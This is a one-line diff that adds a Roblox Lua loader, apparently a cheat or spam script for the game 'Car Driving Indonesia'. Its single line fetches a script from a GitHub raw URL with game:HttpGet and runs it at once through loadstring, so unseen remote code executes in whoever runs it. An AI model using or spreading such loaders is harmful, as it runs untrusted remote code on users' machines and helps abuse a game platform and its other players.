@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/car-driving-indonesia-spam2-gqb8iyb8mdhdc8.lua"))()
